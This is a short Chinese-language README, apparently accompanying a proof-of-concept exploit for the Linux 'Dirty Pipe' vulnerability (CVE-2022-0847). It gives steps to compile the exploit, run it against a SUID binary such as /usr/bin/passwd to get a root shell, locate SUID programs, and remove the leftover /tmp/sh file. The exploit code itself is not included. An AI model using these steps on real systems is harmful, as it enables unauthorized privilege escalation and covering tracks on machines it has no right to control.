# CVE-2022-0847 POC

> 来源：https://www.exploit-db.com/exploits/50808

1. 编译

   在linux中 `gcc -o dirty dirty.c`编译POC程序

2. 使用

   `./dirty SUID`执行程序。其中，SUID是指具有SUID的程序的路径

   一般可以用 `/usr/bin/passwd`，也就是执行`./dirty /usr/bin/passwd`

   ![image-20220315163100154](README.assets/image-20220315163100154.png)

   可以获取root的shell
   
3. 可以使用`find / -perm /4000`查询具有SUID的程序。

   ![image-20220315164326855](README.assets/image-20220315164326855.png)

   ![image-20220315164346358](README.assets/image-20220315164346358.png)

4. 别忘了删除 `/tmp/sh`

   ![image-20220315165450528](README.assets/image-20220315165450528.png)



